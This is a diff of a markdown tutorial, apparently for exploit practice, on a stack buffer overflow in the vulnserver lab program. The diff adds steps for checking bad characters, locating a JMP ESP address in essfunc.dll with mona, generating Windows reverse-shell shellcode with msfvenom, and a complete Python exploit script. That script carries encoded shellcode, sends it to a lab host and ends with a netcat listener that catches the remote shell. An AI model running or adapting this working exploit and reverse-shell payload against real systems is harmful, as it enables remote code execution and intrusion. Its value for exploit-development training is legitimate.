@@ -166,7 +166,7 @@ s.close()
 It can be verified that the EIP registry has the value `42424242` at the moment of the crash, which is equivalent to `BBBB`.
 
 ### Badchars detection
-Now we have control over the EIP registry, badchars have to be checked. Badchars are characters that are not suitable to be included in the shellcode, and the way of verifying it is to send all of them after the value that will overwrite the EIP registry, so that all of those values will be stored in memory. When any of them does not appear in memory, it means it is a bad character. Code:
+Now we have control over the EIP registry, badchars have to be checked. Badchars are characters that are not suitable to be included in the shellcode, and the way of verifying it is to send all of them after the value that will overwrite the EIP registry, so that all of those values will be stored in the stack. When any of them does not appear in the dump, it means it is a bad character. Code:
 
 ```
 #!/usr/bin/python
@@ -185,39 +185,76 @@ s.close()
 
 To check the badcharacters, go to the value of ESP on the Immunity debugger -> right click -> follow in dump. Check all the hexa values. They should start from the first character we sent. Next step is to see if we are missing characters, and in case we miss any that will be a bad character.
 
-download mona https://github.com/corelan/mona
+### Find JMP ESP
+JMP ESP is an assembly command that allows to jump to execute what is in the stack. As we can control what is included in the stack (as we saw with the badchars, that were stored in the stack), this command will come handy if we get to store shellcode into the stack.
 
-cp mona.py on Windows to C:/Program Files x86/Immunity Inc/Immunity Debugger/PyCommands
+To be able to search for that instruction inside the program we are debugging, we need to add a Immunity command called `mona`:
+- download mona https://github.com/corelan/mona
+- cp mona.py on Windows to C:/Program Files x86/Immunity Inc/Immunity Debugger/PyCommands
 
-then attach again from the debugger
-on the command white line write: `!mona modules`
+Then on the command white line write on Immunity run: `!mona modules`. This will allow us to see what modules loaded by mona do not have checks that would prevent us to use them to perform a buffer overflow attack. In this case `essfunc.dll` looks good.
 
-Get the 
-
-From Kali
+Now, let's check from our Kali machine which is the hex representation of a JMP ESP to look for it on our module essfunc.dll:
 ```
 kali@kali:~/repositories$ /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 nasm > JMP ESP
 00000000  FFE4              jmp esp
 ```
 
-ON the debugger
-!mona find -s "FFE4"
-
-From the results, find a module that does not have any memory check (several "False"). In this case essfunc.dll:
-Log data, item 11
- Address=625011AF
- Message=  0x625011af : "\xff\xe4" |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\User\repositories\vulnserver\essfunc.dll)
-
-Let's search for the location of the JMP ESP:
-
+The hex representation is FFE4. Using mona again, search for the address of an eventual JMP ESP command in essfunc.dll:
+```
 !mona find -s "\xff\xe4" -m essfunc.dll
+```
 
-Click the black arrow that points to the right and then go to the address 625011af
-Add a breakpoint there
+The result indicates that `0x625011af` contains the instruction we need.
 
+### Generate shellcode and get shell access
+Generate shellcode (substitute IP and PORT, and also check for the bad chars, here just the null byte is added as a bad char):
+```
+msfvenom -p windows/shell_reverse_tcp LHOST={{attackerIP}} LPORT={{attackerPort}} EXITFUNC=thread -f c -a x86 -b "\x00"
+```
 
-msfvenom -p windows/shell_reverse_tcp LHOST={{attackerIP}} LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
+Final script:
+```
+kali@kali:~/buffer_overflow$ cat 5.py 
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+overflow = ("\xdb\xd3\xbd\x67\xc5\xc1\x1c\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
+"\x52\x31\x6f\x17\x03\x6f\x17\x83\xa0\xc1\x23\xe9\xd2\x22\x21"
+"\x12\x2a\xb3\x46\x9a\xcf\x82\x46\xf8\x84\xb5\x76\x8a\xc8\x39"
+"\xfc\xde\xf8\xca\x70\xf7\x0f\x7a\x3e\x21\x3e\x7b\x13\x11\x21"
+"\xff\x6e\x46\x81\x3e\xa1\x9b\xc0\x07\xdc\x56\x90\xd0\xaa\xc5"
+"\x04\x54\xe6\xd5\xaf\x26\xe6\x5d\x4c\xfe\x09\x4f\xc3\x74\x50"
+"\x4f\xe2\x59\xe8\xc6\xfc\xbe\xd5\x91\x77\x74\xa1\x23\x51\x44"
+"\x4a\x8f\x9c\x68\xb9\xd1\xd9\x4f\x22\xa4\x13\xac\xdf\xbf\xe0"
+"\xce\x3b\x35\xf2\x69\xcf\xed\xde\x88\x1c\x6b\x95\x87\xe9\xff"
+"\xf1\x8b\xec\x2c\x8a\xb0\x65\xd3\x5c\x31\x3d\xf0\x78\x19\xe5"
+"\x99\xd9\xc7\x48\xa5\x39\xa8\x35\x03\x32\x45\x21\x3e\x19\x02"
+"\x86\x73\xa1\xd2\x80\x04\xd2\xe0\x0f\xbf\x7c\x49\xc7\x19\x7b"
+"\xae\xf2\xde\x13\x51\xfd\x1e\x3a\x96\xa9\x4e\x54\x3f\xd2\x04"
+"\xa4\xc0\x07\x8a\xf4\x6e\xf8\x6b\xa4\xce\xa8\x03\xae\xc0\x97"
+"\x34\xd1\x0a\xb0\xdf\x28\xdd\xb5\x1f\x30\x12\xa2\x1d\x34\x3d"
+"\x6e\xab\xd2\x57\x9e\xfd\x4d\xc0\x07\xa4\x05\x71\xc7\x72\x60"
+"\xb1\x43\x71\x95\x7c\xa4\xfc\x85\xe9\x44\x4b\xf7\xbc\x5b\x61"
+"\x9f\x23\xc9\xee\x5f\x2d\xf2\xb8\x08\x7a\xc4\xb0\xdc\x96\x7f"
+"\x6b\xc2\x6a\x19\x54\x46\xb1\xda\x5b\x47\x34\x66\x78\x57\x80"
+"\x67\xc4\x03\x5c\x3e\x92\xfd\x1a\xe8\x54\x57\xf5\x47\x3f\x3f"
+"\x80\xab\x80\x39\x8d\xe1\x76\xa5\x3c\x5c\xcf\xda\xf1\x08\xc7"
+"\xa3\xef\xa8\x28\x7e\xb4\xc9\xca\xaa\xc1\x61\x53\x3f\x68\xec"
+"\x64\xea\xaf\x09\xe7\x1e\x50\xee\xf7\x6b\x55\xaa\xbf\x80\x27"
+"\xa3\x55\xa6\x94\xc4\x7f")
+
+shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow
+
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('10.0.2.4', 9999))
+s.send(('TRUN /.:/' + shellcode))
+s.close()
+```
+
+Then just listen with netcat on port 4444 and run the script et voila.
 
 ## Linux Buffer Overflow
 This is a classic example of a C program that is vulnerable to buffer overflow attacks:
